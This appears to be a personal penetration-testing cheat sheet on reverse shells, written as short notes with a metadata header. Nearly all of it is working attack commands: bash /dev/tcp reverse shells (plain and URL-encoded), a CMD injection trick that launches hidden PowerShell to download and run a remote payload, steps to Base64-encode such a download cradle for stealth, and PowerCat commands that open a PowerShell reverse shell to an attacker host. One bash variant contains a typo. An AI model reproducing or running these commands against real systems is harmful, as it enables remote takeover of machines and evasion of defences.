---
title: Reverse Shells
updated: 2025-05-12 01:00:37Z
created: 2025-04-18 11:39:51Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

Start a Netcat reverse shell:
`nc -nvlp <port>`

Start Web Server using python3
`python3 -m http.server <port>`

* * * 
## Bash
`bash -i >& /dev/tcp/<target>/<port> 0>&1`
`bash -c "bash -i >& /dev/tcp/<target>/<port> 0)&1"` 
**URL Encoded:**
`bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<target>%2F<port>%200%3E%261%22`

* * *
## CMD
Inject anything (eg **calc**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c calc') do @%i`

Inject reverse shell (**ps1**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/payload.ps1')"') do @%i`

Wrap in a one-liner for batch file (**.bat**)
```
@echo off
for /f "delims=" %%i in ('dir 2^>^&1 *^|echo calc') do %%i
```

* * *
## PowerShell
**Base64 Encode PowerShell Commands**

1. Build your PowerShell command:
`IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')`
2. Convert to **Base64** (PowerShell expects UTF-16LE)
```
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```
3. Drop it in your payload:
`Invoke-Expression "powershell -nop -w hidden -enc XXXXXXXXXXXXXXX"`
* * *

**PowerCat**
. 1. `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /scripts/reverse_shells/powercat.ps1`
2. Start HTTP server to host the powercat script:
`python3 -m http.server 80`
3. Start a netcat listener
`nc -nvlp <port>`
4. Execute the script:
```
IEX (New-Object System.Net.Webclient).DownloadString ("http://<kali>/powercat.ps1");
powercat -c <kali> -p <port> -e powershell
```



